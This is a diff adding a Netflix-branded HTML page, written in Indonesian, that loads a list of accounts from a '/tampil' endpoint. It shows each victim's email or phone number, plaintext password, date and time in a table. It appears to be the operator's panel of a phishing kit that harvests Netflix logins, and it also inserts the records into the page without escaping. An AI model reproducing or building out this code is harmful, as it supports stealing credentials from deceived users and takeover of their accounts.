@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Akun Netflix</title>
+    <link rel="shortcut icon" href="https://www.netflix.com/in/favicon.ico" type="image/x-icon">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.js"
+        integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
+
+    <style>
+        * {
+            margin-left: 10px;
+        }
+
+        table {
+            font-family: arial, sans-serif;
+            border-collapse: collapse;
+            width: 95%;
+        }
+
+        td,
+        th {
+            border: 1px solid #dddddd;
+            text-align: left;
+            padding: 8px;
+        }
+
+        th {
+            font-size: 1.2rem;
+            background-color: gray;
+            padding-top: 10px;
+            padding-bottom: 10px;
+        }
+
+        tr:nth-child(even) {
+            background-color: #dddddd;
+        }
+
+        .netflix {
+            width: 175px;
+            top: 10px;
+            left: 10px;
+            margin-left: 10px;
+            margin-top: 7px;
+            margin-bottom: 20px;
+        }
+    </style>
+    <script>
+        $(document).ready(function () {
+            tampil();
+        });
+
+        function tampil() {
+            $.ajax({
+                type: 'GET',
+                url: '/tampil',
+                data: {},
+                success: function (response) {
+                    let rows = response['daftarakun'];
+                    for (let i = 0; i < rows.length; i++) {
+                        let email = rows[i]['email'];
+                        let password = rows[i]['password'];
+                        let tanggal = rows[i]['tanggal'];
+                        let waktu = rows[i]['jam'];
+
+                        let temp_html = `
+                                <tr>
+                                    <td>${email}</td>
+                                    <td>${password}</td>
+                                    <td>${tanggal}</td>
+                                    <td>${waktu}</td>
+                                </tr>`;
+                        $("#data").append(temp_html);
+                    }
+                }
+            });
+        }
+    </script>
+</head>
+
+<body>
+    <a href="/">
+        <img class="netflix" src="static/images/logoNetflix.png" alt="Netflix Logo">
+    </a>
+
+    <table id="data">
+        <tr>
+            <th>Email / No Handphone</th>
+            <th>Password</th>
+            <th>Tanggal</th>
+            <th>Jam</th>
+        </tr>
+    </table>
+
+</body>
+
+</html>
